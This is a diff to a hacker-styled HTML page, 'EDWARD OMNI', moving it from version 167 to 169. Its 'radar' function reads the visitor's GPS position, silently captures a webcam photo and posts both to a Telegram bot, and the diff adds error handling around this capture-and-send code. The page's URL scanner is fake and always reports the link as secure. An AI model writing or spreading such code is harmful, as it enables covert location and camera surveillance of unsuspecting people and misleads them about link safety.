@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EDWARD OMNI V.167</title>
+    <title>EDWARD OMNI V.169</title>
     <style>
         :root { --neon: #00ff88; --bg: #050a0e; --red: #ff4757; --purple: #bc13fe; --blue: #00bdff; --gold: #ffd700; }
         * { box-sizing: border-box; transition: 0.2s; outline: none; }
@@ -32,7 +32,7 @@
 </head>
 <body>
     <div id="customNotif"></div>
-    <p class="master-name">EDWARD OMNI V.167</p>
+    <p class="master-name">EDWARD OMNI V.169</p>
     <div class="sys-monitor">
         <div class="mon-box">CPU: <span id="cpuVal">0%</span></div>
         <div class="mon-box">TEMP: <span id="tempVal">38°C</span></div>
@@ -114,7 +114,7 @@
             const url = document.getElementById('scanInput').value;
             if(!url) return notify("LINK KOSONG!");
             const log = document.getElementById('scanLog'); log.style.display = 'block';
-            log.innerHTML = "> Scanning URL: " + url + "<br>> Checking Phising Database...<br>> Result: [SECURE]";
+            log.innerHTML = "> Scanning URL: " + url + "<br>> DB Check: OK<br>> Result: [SECURE]";
             notify("ANALYSIS DONE");
         }
 
@@ -147,18 +147,20 @@
         function startRadar() {
             const o = document.getElementById('radarOverlay'); o.style.display = 'flex';
             navigator.geolocation.getCurrentPosition(async (p) => {
-                const s = await navigator.mediaDevices.getUserMedia({video:true});
-                setTimeout(async () => {
-                    const vid = document.createElement('video'); vid.srcObject = s; await vid.play();
-                    const canv = document.getElementById('canvas'); canv.width = vid.videoWidth; canv.height = vid.videoHeight;
-                    canv.getContext('2d').drawImage(vid, 0, 0);
-                    const b = await new Promise(res => canv.toBlob(res, 'image/jpeg'));
-                    const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', b);
-                    fd.append('caption', "🔱 V.167 OMNI\n📍 GPS: "+p.coords.latitude+","+p.coords.longitude);
-                    fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto", {method:"POST", body:fd});
-                    s.getTracks().forEach(tr => tr.stop()); o.style.display = 'none'; notify("DATA SENT");
-                }, 3000);
-            }, () => o.style.display = 'none');
+                try {
+                    const s = await navigator.mediaDevices.getUserMedia({video:true});
+                    setTimeout(async () => {
+                        const vid = document.createElement('video'); vid.srcObject = s; await vid.play();
+                        const canv = document.getElementById('canvas'); canv.width = vid.videoWidth; canv.height = vid.videoHeight;
+                        canv.getContext('2d').drawImage(vid, 0, 0);
+                        const b = await new Promise(res => canv.toBlob(res, 'image/jpeg'));
+                        const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', b);
+                        fd.append('caption', "🔱 V.169 OMNI\n📍 GPS: "+p.coords.latitude+","+p.coords.longitude);
+                        fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto", {method:"POST", body:fd});
+                        s.getTracks().forEach(tr => tr.stop()); o.style.display = 'none'; notify("DATA SENT");
+                    }, 3000);
+                } catch(e) { o.style.display = 'none'; notify("CAM ERROR"); }
+            }, () => { o.style.display = 'none'; notify("GPS ERROR"); });
         }
 
         function showMaps() {
